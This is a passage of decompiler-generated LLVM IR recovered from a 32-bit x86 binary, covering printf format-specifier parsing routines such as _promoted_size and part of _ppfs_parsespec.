  %v6_805c74f = sub i32 7, %v6_805c74b
  %v7_805c74f = and i32 %v6_805c74f, %v6_805c74b
  %v8_805c74f = icmp slt i32 %v7_805c74f, 0
  %v1_805c754 = add i32 %v1_805c7be22, 76
  %v2_805c754 = inttoptr i32 %v1_805c754 to i32*
  %v3_805c754 = load i32, i32* %v2_805c754, align 4
  store i32 %v3_805c754, i32* %edx.global-to-local, align 4
  %v3_805c757 = icmp eq i1 %v10_805c74f, %v8_805c74f
  br i1 %v3_805c757, label %dec_label_pc_805c767, label %dec_label_pc_805c759

dec_label_pc_805c759:                             ; preds = %dec_label_pc_805c754
  %tmp13 = icmp slt i32 %v6_805c74b, 3
  %v9_805c760 = icmp eq i32 %v6_805c74b, 7
  %v1_805c763 = icmp eq i1 %v9_805c760, false
  %or.cond = or i1 %tmp13, %v1_805c763
  br i1 %or.cond, label %dec_label_pc_805c7b0, label %dec_label_pc_805c792

dec_label_pc_805c767:                             ; preds = %dec_label_pc_805c754
  %tmp14 = icmp sgt i32 %v6_805c74b, 1024
  br i1 %tmp14, label %dec_label_pc_805c770, label %dec_label_pc_805c7b0

dec_label_pc_805c770:                             ; preds = %dec_label_pc_805c767
  %v6_805c770 = icmp eq i32 %v6_805c74b, 2048
  br i1 %v6_805c770, label %dec_label_pc_805c780, label %dec_label_pc_805c777

dec_label_pc_805c777:                             ; preds = %dec_label_pc_805c770
  %v9_805c777 = icmp eq i32 %v6_805c74b, 2055
  %v1_805c77c = icmp eq i1 %v9_805c777, false
  br i1 %v1_805c77c, label %dec_label_pc_805c7b0, label %dec_label_pc_805c7a1

dec_label_pc_805c780:                             ; preds = %dec_label_pc_805c770
  %v1_805c780 = add i32 %v3_805c754, 8
  store i32 %v1_805c780, i32* %eax.global-to-local, align 4
  store i32 %v1_805c780, i32* %v2_805c754, align 4
  %v0_805c786 = load i32, i32* %edx.global-to-local, align 4
  %v1_805c786 = inttoptr i32 %v0_805c786 to i32*
  %v2_805c786 = load i32, i32* %v1_805c786, align 4
  store i32 %v2_805c786, i32* %eax.global-to-local, align 4
  %v1_805c788 = add i32 %v0_805c786, 4
  %v2_805c788 = inttoptr i32 %v1_805c788 to i32*
  %v3_805c788 = load i32, i32* %v2_805c788, align 4
  store i32 %v3_805c788, i32* %edx.global-to-local, align 4
  %v1_805c78b = load i32, i32* %ebx.global-to-local, align 4
  %v2_805c78b = inttoptr i32 %v1_805c78b to i32*
  store i32 %v2_805c786, i32* %v2_805c78b, align 4
  %v0_805c78d = load i32, i32* %edx.global-to-local, align 4
  %v1_805c78d = load i32, i32* %ebx.global-to-local, align 4
  %v2_805c78d = add i32 %v1_805c78d, 4
  %v3_805c78d = inttoptr i32 %v2_805c78d to i32*
  store i32 %v0_805c78d, i32* %v3_805c78d, align 4
  br label %dec_label_pc_805c7ba

dec_label_pc_805c792:                             ; preds = %dec_label_pc_805c759
  %v3_805c792 = load i32, i32* %v2_805c754, align 4
  store i32 %v3_805c792, i32* %edx.global-to-local, align 4
  %v1_805c795 = add i32 %v3_805c792, 8
  store i32 %v1_805c795, i32* %eax.global-to-local, align 4
  store i32 %v1_805c795, i32* %v2_805c754, align 4
  %v0_805c79b = load i32, i32* %edx.global-to-local, align 4
  %v1_805c79b = inttoptr i32 %v0_805c79b to double*
  %v2_805c79b = load double, double* %v1_805c79b, align 4
  %v2_805c79d = load i32, i32* %ebx.global-to-local, align 4
  %v4_805c79d = inttoptr i32 %v2_805c79d to double*
  store double %v2_805c79b, double* %v4_805c79d, align 4
  br label %dec_label_pc_805c7ba

dec_label_pc_805c7a1:                             ; preds = %dec_label_pc_805c777
  %v3_805c7a1 = load i32, i32* %v2_805c754, align 4
  store i32 %v3_805c7a1, i32* %edx.global-to-local, align 4
  %v1_805c7a4 = add i32 %v3_805c7a1, 12
  store i32 %v1_805c7a4, i32* %eax.global-to-local, align 4
  store i32 %v1_805c7a4, i32* %v2_805c754, align 4
  %v0_805c7aa = load i32, i32* %edx.global-to-local, align 4
  %v1_805c7aa = inttoptr i32 %v0_805c7aa to x86_fp80*
  %v2_805c7aa = load x86_fp80, x86_fp80* %v1_805c7aa, align 4
  %v2_805c7ac = load i32, i32* %ebx.global-to-local, align 4
  %v3_805c7ac = inttoptr i32 %v2_805c7ac to x86_fp80*
  store x86_fp80 %v2_805c7aa, x86_fp80* %v3_805c7ac, align 4
  br label %dec_label_pc_805c7ba

dec_label_pc_805c7b0:                             ; preds = %dec_label_pc_805c759, %dec_label_pc_805c767, %dec_label_pc_805c777
  %v1_805c7b0 = add i32 %v3_805c754, 4
  store i32 %v1_805c7b0, i32* %eax.global-to-local, align 4
  store i32 %v1_805c7b0, i32* %v2_805c754, align 4
  %v0_805c7b6 = load i32, i32* %edx.global-to-local, align 4
  %v1_805c7b6 = inttoptr i32 %v0_805c7b6 to i32*
  %v2_805c7b6 = load i32, i32* %v1_805c7b6, align 4
  store i32 %v2_805c7b6, i32* %eax.global-to-local, align 4
  %v1_805c7b8 = load i32, i32* %ebx.global-to-local, align 4
  %v2_805c7b8 = inttoptr i32 %v1_805c7b8 to i32*
  store i32 %v2_805c7b6, i32* %v2_805c7b8, align 4
  br label %dec_label_pc_805c7ba

dec_label_pc_805c7ba:                             ; preds = %dec_label_pc_805c7a1, %dec_label_pc_805c792, %dec_label_pc_805c780, %dec_label_pc_805c7b0
  %v0_805c7ba = load i32, i32* %ebx.global-to-local, align 4
  %v1_805c7ba = add i32 %v0_805c7ba, 12
  store i32 %v1_805c7ba, i32* %ebx.global-to-local, align 4
  %v0_805c7bd.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_805c7be.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_805c7bd

dec_label_pc_805c7bd:                             ; preds = %dec_label_pc_805c74b, %dec_label_pc_805c7ba
  %v1_805c7be = phi i32 [ %v1_805c7be22, %dec_label_pc_805c74b ], [ %v1_805c7be.pre, %dec_label_pc_805c7ba ]
  %v0_805c7bd = phi i32 [ %v1_805c74b21, %dec_label_pc_805c74b ], [ %v0_805c7bd.pre, %dec_label_pc_805c7ba ]
  %v1_805c7bd = add i32 %v0_805c7bd, 1
  store i32 %v1_805c7bd, i32* %esi.global-to-local, align 4
  %v2_805c7be = add i32 %v1_805c7be, 28
  %v3_805c7be = inttoptr i32 %v2_805c7be to i32*
  %v4_805c7be = load i32, i32* %v3_805c7be, align 4
  %v5_805c7c1 = icmp slt i32 %v1_805c7bd, %v4_805c7be
  br i1 %v5_805c7c1, label %dec_label_pc_805c74b, label %dec_label_pc_805c7be.dec_label_pc_805c7f3.loopexit_crit_edge

dec_label_pc_805c7c5:                             ; preds = %entry
  br i1 %v1_805c7cc, label %dec_label_pc_805c7dc, label %dec_label_pc_805c7ce

dec_label_pc_805c7ce:                             ; preds = %dec_label_pc_805c7c5
  %v1_805c7ce = add i32 %arg1, 36
  %v2_805c7ce = inttoptr i32 %v1_805c7ce to i8*
  %v3_805c7ce = load i8, i8* %v2_805c7ce, align 1
  %v2_805c7d2 = zext i8 %v3_805c7ce to i32
  %v3_805c7d2 = mul nuw nsw i32 %v2_805c7d2, 12
  store i32 %v3_805c7d2, i32* %eax.global-to-local, align 4
  %v2_805c7d5 = add i32 %arg1, 68
  %v3_805c7d5 = add i32 %v2_805c7d5, %v3_805c7d2
  %v4_805c7d5 = inttoptr i32 %v3_805c7d5 to i32*
  %v5_805c7d5 = load i32, i32* %v4_805c7d5, align 4
  store i32 %v5_805c7d5, i32* %eax.global-to-local, align 4
  store i32 %v5_805c7d5, i32* %v2_805c7c5, align 4
  %v0_805c7dc.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_805c7dc

dec_label_pc_805c7dc:                             ; preds = %dec_label_pc_805c7c5, %dec_label_pc_805c7ce
  %v1_805c7f0 = phi i32 [ %arg1, %dec_label_pc_805c7c5 ], [ %v0_805c7dc.pre, %dec_label_pc_805c7ce ]
  %v1_805c7dc = add i32 %v1_805c7f0, 4
  %v2_805c7dc = inttoptr i32 %v1_805c7dc to i32*
  %v3_805c7dc = load i32, i32* %v2_805c7dc, align 4
  %v8_805c7dc = icmp eq i32 %v3_805c7dc, -2147483648
  %v1_805c7e3 = icmp eq i1 %v8_805c7dc, false
  br i1 %v1_805c7e3, label %dec_label_pc_805c7f3, label %dec_label_pc_805c7e5

dec_label_pc_805c7e5:                             ; preds = %dec_label_pc_805c7dc
  %v1_805c7e5 = add i32 %v1_805c7f0, 37
  %v2_805c7e5 = inttoptr i32 %v1_805c7e5 to i8*
  %v3_805c7e5 = load i8, i8* %v2_805c7e5, align 1
  %v2_805c7e9 = zext i8 %v3_805c7e5 to i32
  %v3_805c7e9 = mul nuw nsw i32 %v2_805c7e9, 12
  store i32 %v3_805c7e9, i32* %eax.global-to-local, align 4
  %v1_805c7ec = load i32, i32* %ebx.global-to-local, align 4
  %v2_805c7ec = add nsw i32 %v3_805c7e9, -12
  %v3_805c7ec = add i32 %v2_805c7ec, %v1_805c7ec
  %v4_805c7ec = inttoptr i32 %v3_805c7ec to i32*
  %v5_805c7ec = load i32, i32* %v4_805c7ec, align 4
  store i32 %v5_805c7ec, i32* %eax.global-to-local, align 4
  store i32 %v5_805c7ec, i32* %v2_805c7dc, align 4
  %v0_805c7f3.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_805c7f3

dec_label_pc_805c7be.dec_label_pc_805c7f3.loopexit_crit_edge: ; preds = %dec_label_pc_805c7bd
  br label %dec_label_pc_805c7f3.loopexit

dec_label_pc_805c7f3.loopexit:                    ; preds = %dec_label_pc_805c7be.dec_label_pc_805c7f3.loopexit_crit_edge, %dec_label_pc_805c747
  %v1_805c7be.lcssa = phi i32 [ %v1_805c7be, %dec_label_pc_805c7be.dec_label_pc_805c7f3.loopexit_crit_edge ], [ %v1_805c7be15, %dec_label_pc_805c747 ]
  br label %dec_label_pc_805c7f3

dec_label_pc_805c7f3:                             ; preds = %dec_label_pc_805c7f3.loopexit, %dec_label_pc_805c7dc, %dec_label_pc_805c7e5
  %v10_805c7fa = phi i32 [ %v1_805c7be.lcssa, %dec_label_pc_805c7f3.loopexit ], [ %v1_805c7f0, %dec_label_pc_805c7dc ], [ %v0_805c7f3.pre, %dec_label_pc_805c7e5 ]
  %v1_805c7f3 = add i32 %v10_805c7fa, 8
  %v2_805c7f3 = inttoptr i32 %v1_805c7f3 to i32*
  %v3_805c7f3 = load i32, i32* %v2_805c7f3, align 4
  store i32 %v3_805c7f3, i32* %eax.global-to-local, align 4
  %v2_805c7f6 = icmp slt i32 %v3_805c7f3, 0
  %v1_805c7f8 = icmp eq i1 %v2_805c7f6, false
  br i1 %v1_805c7f8, label %dec_label_pc_805c80e, label %dec_label_pc_805c7fa

dec_label_pc_805c7fa:                             ; preds = %dec_label_pc_805c7f3
  %v1_805c7fa = add i32 %v10_805c7fa, 16
  %v2_805c7fa = inttoptr i32 %v1_805c7fa to i32*
  %v3_805c7fa = load i32, i32* %v2_805c7fa, align 4
  %v4_805c7fa = or i32 %v3_805c7fa, 8
  store i32 %v4_805c7fa, i32* %v2_805c7fa, align 4
  %v0_805c7fe = load i32, i32* %eax.global-to-local, align 4
  %v1_805c7fe = sub i32 0, %v0_805c7fe
  store i32 %v1_805c7fe, i32* %eax.global-to-local, align 4
  %v1_805c800 = load i32, i32* @ecx, align 4
  %v2_805c800 = add i32 %v1_805c800, 8
  %v3_805c800 = inttoptr i32 %v2_805c800 to i32*
  store i32 %v1_805c7fe, i32* %v3_805c800, align 4
  %v0_805c803 = load i32, i32* @ecx, align 4
  %v1_805c803 = add i32 %v0_805c803, 16
  %v2_805c803 = inttoptr i32 %v1_805c803 to i32*
  %v3_805c803 = load i32, i32* %v2_805c803, align 4
  %v4_805c803 = and i32 %v3_805c803, -2
  store i32 %v4_805c803, i32* %v2_805c803, align 4
  %v0_805c807 = load i32, i32* @ecx, align 4
  %v1_805c807 = add i32 %v0_805c807, 20
  %v2_805c807 = inttoptr i32 %v1_805c807 to i32*
  store i32 32, i32* %v2_805c807, align 4
  %v0_805c810.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805c80e

dec_label_pc_805c80e:                             ; preds = %dec_label_pc_805c7f3, %dec_label_pc_805c7fa
  %v0_805c810 = phi i32 [ %v3_805c7f3, %dec_label_pc_805c7f3 ], [ %v0_805c810.pre, %dec_label_pc_805c7fa ]
  %v2_805c80e = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805c80e, i32* @ebx, align 4
  ret i32 %v0_805c810

; uselistorder directives
  uselistorder i32 %v3_805c7e9, { 1, 0 }
  uselistorder i32 %v1_805c7bd, { 2, 1, 0 }
  uselistorder i32 %v1_805c7be, { 1, 2, 0 }
  uselistorder i32 %v3_805c754, { 1, 0, 2 }
  uselistorder i32* %v2_805c754, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 %v1_805c74f, { 1, 0 }
  uselistorder i32 %v6_805c74b, { 3, 4, 5, 2, 1, 0, 7, 6, 8 }
  uselistorder i32 %v1_805c74b21, { 1, 0 }
  uselistorder i32 %v1_805c7be15, { 2, 0, 1 }
  uselistorder i1 %v1_805c7cc, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 2, 1, 0 }
  uselistorder i32* %edx.global-to-local, { 6, 0, 1, 2, 3, 4, 5, 7, 8, 9, 10 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 %arg1, { 1, 0, 2, 3, 4, 6, 5, 8, 7 }
  uselistorder label %dec_label_pc_805c80e, { 1, 0 }
  uselistorder label %dec_label_pc_805c7f3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805c7dc, { 1, 0 }
  uselistorder label %dec_label_pc_805c7bd, { 1, 0 }
  uselistorder label %dec_label_pc_805c7ba, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805c7b0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805c74b, { 1, 0 }
  uselistorder label %dec_label_pc_805c747, { 1, 0 }
  uselistorder label %dec_label_pc_805c72d, { 1, 0 }
}

define i32 @_promoted_size(i32 %arg1) local_unnamed_addr {
entry:
  %v0_805c814 = load i32, i32* @eax, align 4
  br label %dec_label_pc_805c81b

dec_label_pc_805c81b:                             ; preds = %dec_label_pc_805c81b, %entry
  %v0_805c81b = phi i32 [ ptrtoint (i8** @global_var_806da9e.696 to i32), %entry ], [ %v1_805c81b, %dec_label_pc_805c81b ]
  %v1_805c81b = add i32 %v0_805c81b, -2
  %v1_805c81e = inttoptr i32 %v1_805c81b to i16*
  %v2_805c81e = load i16, i16* %v1_805c81e, align 2
  %v3_805c81e = sext i16 %v2_805c81e to i32
  %v12_805c821 = icmp ne i32 %v3_805c81e, %v0_805c814
  %v6_805c82b = icmp ugt i32 %v1_805c81b, ptrtoint (i32* @global_var_806da86.697 to i32)
  %or.cond = and i1 %v6_805c82b, %v12_805c821
  br i1 %or.cond, label %dec_label_pc_805c81b, label %dec_label_pc_805c82d

dec_label_pc_805c82d:                             ; preds = %dec_label_pc_805c81b
  %.pre = add i32 %v0_805c81b, -134666888
  %v2_805c833 = sdiv i32 %.pre, 2
  store i32 %v2_805c833, i32* @edx, align 4
  %v1_805c835 = add i32 %v2_805c833, ptrtoint (i8** @global_var_806da9e.696 to i32)
  %v2_805c835 = inttoptr i32 %v1_805c835 to i8*
  %v3_805c835 = load i8, i8* %v2_805c835, align 1
  %v4_805c835 = zext i8 %v3_805c835 to i32
  ret i32 %v4_805c835

; uselistorder directives
  uselistorder i32 %v2_805c833, { 1, 0 }
  uselistorder i32 %v1_805c81b, { 1, 2, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_806da9e.696 to i32), { 1, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %tmp76 = ptrtoint i32* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805c83e = load i32, i32* @edi, align 4
  %v0_805c83f = load i32, i32* @esi, align 4
  %v0_805c840 = load i32, i32* @ebx, align 4
  store i32 %v0_805c840, i32* %stack_var_-16, align 4
  %v4_805c840 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_805c86c = add i32 %tmp76, 24
  %v2_805c86c = inttoptr i32 %v1_805c86c to i32*
  %v3_805c86c = load i32, i32* %v2_805c86c, align 4
  store i32 %v3_805c86c, i32* %eax.global-to-local, align 4
  %v1_805c873 = add i32 %tmp76, 16
  %v2_805c873 = inttoptr i32 %v1_805c873 to i32*
  %v3_805c873 = load i32, i32* %v2_805c873, align 4
  %v1_805c876 = and i32 %v3_805c873, 128
  %v2_805c876 = icmp eq i32 %v1_805c876, 0
  store i32 %v1_805c876, i32* %edi.global-to-local, align 4
  %v1_805c87c = icmp eq i1 %v2_805c876, false
  br i1 %v1_805c87c, label %dec_label_pc_805c88f, label %dec_label_pc_805c87e

dec_label_pc_805c87e:                             ; preds = %entry
  %v2_805c87e = load i32, i32* %arg1, align 4
  br label %dec_label_pc_805c8dc.outer

dec_label_pc_805c889:                             ; preds = %dec_label_pc_805ca17
  %v1_805c889 = add i32 %v0_805ca17.pre.pre, 1
  store i32 %v1_805c889, i32* @esi, align 4
  br label %dec_label_pc_805ca27

dec_label_pc_805c88f:                             ; preds = %entry
  %v15_805c841 = ptrtoint i32* %stack_var_-108 to i32
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805c891

dec_label_pc_805c891:                             ; preds = %dec_label_pc_805c8b9.dec_label_pc_805c891_crit_edge, %dec_label_pc_805c88f
  %v2_805c8a2 = phi i32 [ %v2_805c8a2.pre, %dec_label_pc_805c8b9.dec_label_pc_805c891_crit_edge ], [ %v15_805c841, %dec_label_pc_805c88f ]
  %v3_805c8a2 = phi i32 [ %v1_805c8b9, %dec_label_pc_805c8b9.dec_label_pc_805c891_crit_edge ], [ 0, %dec_label_pc_805c88f ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_805c895 = mul i32 %v3_805c8a2, 4
  store i32 %v1_805c895, i32* @ecx, align 4
  %v2_805c89c = load i32, i32* %arg1, align 4
  store i32 %v2_805c89c, i32* @edx, align 4
  %v2_805c89e = add i32 %v1_805c895, -4
  %v3_805c89e = add i32 %v2_805c89e, %v2_805c89c
  %v4_805c89e = inttoptr i32 %v3_805c89e to i32*
  %v5_805c89e = load i32, i32* %v4_805c89e, align 4
  store i32 %v5_805c89e, i32* %eax.global-to-local, align 4
  %v1_805c8a2 = trunc i32 %v5_805c89e to i8
  %v4_805c8a2 = add i32 %v2_805c8a2, 36
  %v5_805c8a2 = add i32 %v4_805c8a2, %v3_805c8a2
  %v6_805c8a2 = inttoptr i32 %v5_805c8a2 to i8*
  store i8 %v1_805c8a2, i8* %v6_805c8a2, align 1
  %v0_805c8a6 = load i32, i32* %eax.global-to-local, align 4
  %v1_805c8a6 = urem i32 %v0_805c8a6, 256
  %v2_805c8a6 = load i32, i32* @ebx, align 4
  %v3_805c8a6 = and i32 %v2_805c8a6, -256
  %v4_805c8a6 = or i32 %v3_805c8a6, %v1_805c8a6
  store i32 %v4_805c8a6, i32* @ebx, align 4
  %v1_805c8a8 = mul i32 %v0_805c8a6, 16777216
  %v2_805c8a8 = sdiv i32 %v1_805c8a8, 16777216
  store i32 %v2_805c8a8, i32* %eax.global-to-local, align 4
  %v1_805c8ab = load i32, i32* @edx, align 4
  %v2_805c8ab = load i32, i32* @ecx, align 4
  %v3_805c8ab = add i32 %v1_805c8ab, -4
  %v4_805c8ab = add i32 %v3_805c8ab, %v2_805c8ab
  %v5_805c8ab = inttoptr i32 %v4_805c8ab to i32*
  %v6_805c8ab = load i32, i32* %v5_805c8ab, align 4
  %v17_805c8ab = icmp eq i32 %v2_805c8a8, %v6_805c8ab
  %v1_805c8af = icmp eq i1 %v17_805c8ab, false
  br i1 %v1_805c8af, label %dec_label_pc_805cc01, label %dec_label_pc_805c8b5

dec_label_pc_805c8b5:                             ; preds = %dec_label_pc_805c891
  %v3_805c8b5 = trunc i32 %v0_805c8a6 to i8
  %v4_805c8b5 = icmp eq i8 %v3_805c8b5, 0
  br i1 %v4_805c8b5, label %dec_label_pc_805c8bf, label %dec_label_pc_805c8b9

dec_label_pc_805c8b9:                             ; preds = %dec_label_pc_805c8b5
  %v0_805c8b9 = load i32, i32* %esi.global-to-local, align 4
  %v1_805c8b9 = add i32 %v0_805c8b9, 1
  store i32 %v1_805c8b9, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805c8b9, 32
  br i1 %tmp, label %dec_label_pc_805c8b9.dec_label_pc_805c891_crit_edge, label %dec_label_pc_805c8bf

dec_label_pc_805c8b9.dec_label_pc_805c891_crit_edge: ; preds = %dec_label_pc_805c8b9
  %v2_805c8a2.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805c891

dec_label_pc_805c8bf:                             ; preds = %dec_label_pc_805c8b9, %dec_label_pc_805c8b5
  %v2_805c8c4 = ptrtoint i32* %stack_var_-71 to i32
  br label %dec_label_pc_805c8dc.outer

dec_label_pc_805c8dc.outer:                       ; preds = %dec_label_pc_805c8bf, %dec_label_pc_805c87e, %dec_label_pc_805c9f9
  %v0_805c8e8.ph94 = phi i32 [ %v1_805c9f9, %dec_label_pc_805c9f9 ], [ %v2_805c87e, %dec_label_pc_805c87e ], [ %v2_805c8c4, %dec_label_pc_805c8bf ]
  %stack_var_-32.1.ph = phi i32 [ %stack_var_-32.3, %dec_label_pc_805c9f9 ], [ %tmp66, %dec_label_pc_805c87e ], [ %tmp66, %dec_label_pc_805c8bf ]
  %stack_var_-96.1.ph = phi i32 [ %v0_805c882, %dec_label_pc_805c9f9 ], [ 0, %dec_label_pc_805c87e ], [ 0, %dec_label_pc_805c8bf ]
  %stack_var_-88.1.ph = phi i32 [ %stack_var_-88.3, %dec_label_pc_805c9f9 ], [ %v3_805c86c, %dec_label_pc_805c87e ], [ %v3_805c86c, %dec_label_pc_805c8bf ]
  %stack_var_-92.1.ph = phi i64 [ -1, %dec_label_pc_805c9f9 ], [ 0, %dec_label_pc_805c87e ], [ 0, %dec_label_pc_805c8bf ]
  %v7_805c8e3 = mul nsw i64 %stack_var_-92.1.ph, -4
  %v8_805c8e3 = trunc i64 %v7_805c8e3 to i32
  %v2_805c8eb = add i32 %v8_805c8e3, 80
  br label %dec_label_pc_805c8dc

dec_label_pc_805c8dc:                             ; preds = %dec_label_pc_805c8dc.outer, %dec_label_pc_805c999
  %v0_805c8e8 = phi i32 [ %v0_805c9a6, %dec_label_pc_805c999 ], [ %v0_805c8e8.ph94, %dec_label_pc_805c8dc.outer ]
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.2, %dec_label_pc_805c999 ], [ %stack_var_-32.1.ph, %dec_label_pc_805c8dc.outer ]
  %stack_var_-88.1 = phi i32 [ %stack_var_-88.2, %dec_label_pc_805c999 ], [ %stack_var_-88.1.ph, %dec_label_pc_805c8dc.outer ]
  store i32 %v0_805c8e8, i32* @edx, align 4
  %v1_805c8dc = inttoptr i32 %v0_805c8e8 to i8*
  %v2_805c8dc = load i8, i8* %v1_805c8dc, align 1
  %v11_805c8dc = icmp eq i8 %v2_805c8dc, 42
  store i32 %v0_805c8e8, i32* @esi, align 4
  %v1_805c8e1 = icmp eq i1 %v11_805c8dc, false
  br i1 %v1_805c8e1, label %dec_label_pc_805c8f3, label %dec_label_pc_805c8e3

dec_label_pc_805c8e3:                             ; preds = %dec_label_pc_805c8dc
  store i32 %v8_805c8e3, i32* %eax.global-to-local, align 4
  %v1_805c8e8 = add i32 %v0_805c8e8, 1
  store i32 %v1_805c8e8, i32* @esi, align 4
  %v0_805c8eb = load i32, i32* @esp, align 4
  %v3_805c8eb = add i32 %v2_805c8eb, %v0_805c8eb
  %v4_805c8eb = inttoptr i32 %v3_805c8eb to i32*
  store i32 0, i32* %v4_805c8eb, align 4
  %v0_805c90d.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805c8f3

dec_label_pc_805c8f3:                             ; preds = %dec_label_pc_805c8dc, %dec_label_pc_805c8e3
  %v0_805c90d.pre = phi i32 [ %v0_805c8e8, %dec_label_pc_805c8dc ], [ %v0_805c90d.pre.pre, %dec_label_pc_805c8e3 ]
  %v0_805c8f3 = load i32, i32* inttoptr (i32 134696908 to i32*), align 4
  store i32 %v0_805c8f3, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_805c90d.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_805c90d124 = inttoptr i32 %v0_805c90d.pre to i8*
  %v2_805c90d125 = load i8, i8* %v1_805c90d124, align 1
  %v3_805c90d126 = zext i8 %v2_805c90d125 to i32
  %v5_805c90d127 = and i32 %v4_805c90d.pre, -256
  %v6_805c90d128 = or i32 %v3_805c90d126, %v5_805c90d127
  store i32 %v6_805c90d128, i32* %eax.global-to-local, align 4
  %v2_805c90f129 = sext i8 %v2_805c90d125 to i32
  store i32 %v2_805c90f129, i32* @ecx, align 4
  %v2_805c912130 = mul nsw i32 %v2_805c90f129, 2
  %v3_805c912131 = add i32 %v2_805c912130, %v0_805c8f3
  %v4_805c912132 = inttoptr i32 %v3_805c912131 to i8*
  %v5_805c912133 = load i8, i8* %v4_805c912132, align 1
  %v6_805c912134 = and i8 %v5_805c912133, 8
  %v7_805c912135 = icmp eq i8 %v6_805c912134, 0
  %v1_805c917136 = icmp eq i1 %v7_805c912135, false
  br i1 %v1_805c917136, label %dec_label_pc_805c8fd, label %dec_label_pc_805c919

dec_label_pc_805c8fd:                             ; preds = %dec_label_pc_805c8f3, %dec_label_pc_805c90c
  %v2_805c90f140 = phi i32 [ %v2_805c90f, %dec_label_pc_805c90c ], [ %v2_805c90f129, %dec_label_pc_805c8f3 ]
  %v6_805c90d139 = phi i32 [ %v6_805c90d, %dec_label_pc_805c90c ], [ %v6_805c90d128, %dec_label_pc_805c8f3 ]
  %v0_805c90c138 = phi i32 [ %v1_805c90c, %dec_label_pc_805c90c ], [ %v0_805c90d.pre, %dec_label_pc_805c8f3 ]
  %v1_805c905137 = phi i32 [ %v0_805c92732, %dec_label_pc_805c90c ], [ 0, %dec_label_pc_805c8f3 ]
  %v1_805c8fd = add i32 %v1_805c905137, -4094
  %v6_805c8fd = sub i32 4093, %v1_805c905137
  %v7_805c8fd = and i32 %v6_805c8fd, %v1_805c905137
  %v8_805c8fd = icmp slt i32 %v7_805c8fd, 0
  %v9_805c8fd = icmp eq i32 %v1_805c8fd, 0
  %v10_805c8fd = icmp slt i32 %v1_805c8fd, 0
  %v3_805c903 = icmp eq i1 %v10_805c8fd, %v8_805c8fd
  %v4_805c903 = icmp eq i1 %v9_805c8fd, false
  %v5_805c903 = and i1 %v4_805c903, %v3_805c903
  br i1 %v5_805c903, label %dec_label_pc_805c90c, label %dec_label_pc_805c905

dec_label_pc_805c905:                             ; preds = %dec_label_pc_805c8fd
  %v3_805c905 = mul i32 %v1_805c905137, 10
  store i32 %v3_805c905, i32* %eax.global-to-local, align 4
  %v2_805c908 = add i32 %v3_805c905, -48
  %v3_805c908 = add i32 %v2_805c908, %v2_805c90f140
  store i32 %v3_805c908, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805c90c

dec_label_pc_805c90c:                             ; preds = %dec_label_pc_805c8fd, %dec_label_pc_805c905
  %v0_805c92732 = phi i32 [ %v1_805c905137, %dec_label_pc_805c8fd ], [ %v3_805c908, %dec_label_pc_805c905 ]
  %v4_805c90d28 = phi i32 [ %v6_805c90d139, %dec_label_pc_805c8fd ], [ %v3_805c905, %dec_label_pc_805c905 ]
  %v1_805c90c = add i32 %v0_805c90c138, 1
  store i32 %v1_805c90c, i32* @esi, align 4
  %v1_805c90d = inttoptr i32 %v1_805c90c to i8*
  %v2_805c90d = load i8, i8* %v1_805c90d, align 1
  %v3_805c90d = zext i8 %v2_805c90d to i32
  %v5_805c90d = and i32 %v4_805c90d28, -256
  %v6_805c90d = or i32 %v3_805c90d, %v5_805c90d
  store i32 %v6_805c90d, i32* %eax.global-to-local, align 4
  %v2_805c90f = sext i8 %v2_805c90d to i32
  store i32 %v2_805c90f, i32* @ecx, align 4
  %v2_805c912 = mul nsw i32 %v2_805c90f, 2
  %v3_805c912 = add i32 %v2_805c912, %v0_805c8f3
  %v4_805c912 = inttoptr i32 %v3_805c912 to i8*
  %v5_805c912 = load i8, i8* %v4_805c912, align 1
  %v6_805c912 = and i8 %v5_805c912, 8
  %v7_805c912 = icmp eq i8 %v6_805c912, 0
  %v1_805c917 = icmp eq i1 %v7_805c912, false
  br i1 %v1_805c917, label %dec_label_pc_805c8fd, label %dec_label_pc_805c919

dec_label_pc_805c919:                             ; preds = %dec_label_pc_805c90c, %dec_label_pc_805c8f3
  %v1_805c905.lcssa = phi i32 [ 0, %dec_label_pc_805c8f3 ], [ %v0_805c92732, %dec_label_pc_805c90c ]
  %v0_805c90c.lcssa = phi i32 [ %v0_805c90d.pre, %dec_label_pc_805c8f3 ], [ %v1_805c90c, %dec_label_pc_805c90c ]
